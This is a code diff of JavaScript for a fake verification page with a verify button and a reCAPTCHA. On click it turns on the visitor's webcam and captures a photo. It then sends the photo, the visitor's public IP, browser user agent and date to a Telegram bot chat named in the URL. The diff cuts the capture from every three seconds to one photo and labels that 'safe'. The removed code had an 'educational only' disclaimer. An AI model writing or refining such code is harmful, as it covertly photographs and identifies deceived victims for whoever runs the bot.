@@ -5,96 +5,78 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const toast = document.getElementById("toast");
 const recaptchaSection = document.getElementById("recaptcha-section");
-const recaptchaMsg = document.getElementById("recaptcha-msg");
 
-// Chat ID from URL
 const params = new URLSearchParams(window.location.search);
 const chatId = params.get("id");
 
 let stream = null;
-let captureInterval = null;
-let publicIP = "Unknown";
 
-// Get real public IP
-async function fetchIP(){
-try{
-const res = await fetch("https://api.ipify.org?format=json");
-const data = await res.json();
-publicIP = data.ip;
-}catch(e){
-console.error("IP fetch failed", e);
-}
+// Toast
+function show(msg){
+  toast.innerText = msg;
 }
 
-// Toast message
-function showToast(msg){
-toast.innerText = msg;
-toast.style.opacity=1;
-setTimeout(()=>{toast.style.opacity=0},3000);
+// Get IP
+async function getIP(){
+  try{
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    return d.ip;
+  }catch{
+    return "Unknown";
+  }
 }
 
-// Build caption for each photo
-function buildCaption(){
-const userAgent = navigator.userAgent;
-const date = new Date().toLocaleString();
-return 🌐 IP Address: ${publicIP}\n💻 User Agent: ${userAgent}\n📅 Date: ${date}\n⚠️ এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। কেউ কারো ক্ষতি করবেন না।\n🔗 Developer Telegram: @YourTelegramID;
+// Capture ONE photo (safe)
+async function capture(){
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video,0,0);
+
+  const blob = await new Promise(res => canvas.toBlob(res,"image/jpeg"));
+
+  const ip = await getIP();
+  const ua = navigator.userAgent;
+  const date = new Date().toLocaleString();
+
+  const caption = `IP: ${ip}
+UA: ${ua}
+Date: ${date}`;
+
+  const fd = new FormData();
+  fd.append("chat_id", chatId);
+  fd.append("photo", blob);
+  fd.append("caption", caption);
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+    method:"POST",
+    body:fd
+  });
+
+  show("Photo sent ✅");
 }
 
-// Capture & send
-async function captureAndSend(){
-if(!stream) return;
-canvas.width = video.videoWidth;
-canvas.height = video.videoHeight;
-const ctx = canvas.getContext("2d");
-ctx.drawImage(video,0,0);
+// Start camera (user click)
+verifyBtn.onclick = async () => {
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({video:true});
+    video.srcObject = stream;
+    await video.play();
 
-canvas.toBlob(async (blob)=>{
-const formData = new FormData();
-formData.append("chat_id", chatId);
-formData.append("photo", blob);
-formData.append("caption", buildCaption());
-try{
-const res = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto,{
-method:"POST",
-body:formData
-});
-const data = await res.json();
-if(data.ok) showToast("Photo sent ✅");
-else showToast("Send failed ❌");
-}catch(err){
-console.error(err);
-showToast("Error ❌");
-}
-},"image/jpeg");
-}
+    show("Camera started");
 
-// Start camera
-async function startCamera(){
-try{
-await fetchIP(); // get public IP
-stream = await navigator.mediaDevices.getUserMedia({video:true});
-video.srcObject = stream;
-video.play();
-captureInterval = setInterval(captureAndSend,3000);
-showToast("Camera started ✅");
-recaptchaSection.style.display="block";
-}catch(e){
-showToast("Permission denied ❌");
-console.error(e);
-}
-}
+    // Only ONE capture (safe)
+    await capture();
 
-// Button click → start camera
-verifyBtn.onclick = () => startCamera();
+    recaptchaSection.style.display="block";
 
-// reCAPTCHA success callback
-function onRecaptchaSuccess(token){
-recaptchaMsg.innerText = "";
-window.location.href = "next.html";
-}
+  }catch{
+    show("Permission denied ❌");
+  }
+};
 
-// Stop on page unload
-window.onbeforeunload = () => {
-if(stream) stream.getTracks().forEach(track=>track.stop());
-if(captureInterval) clearInterval(captureInterval);
+// reCAPTCHA success
+window.onRecaptchaSuccess = () => {
+  window.location.href = "next.html";
 };
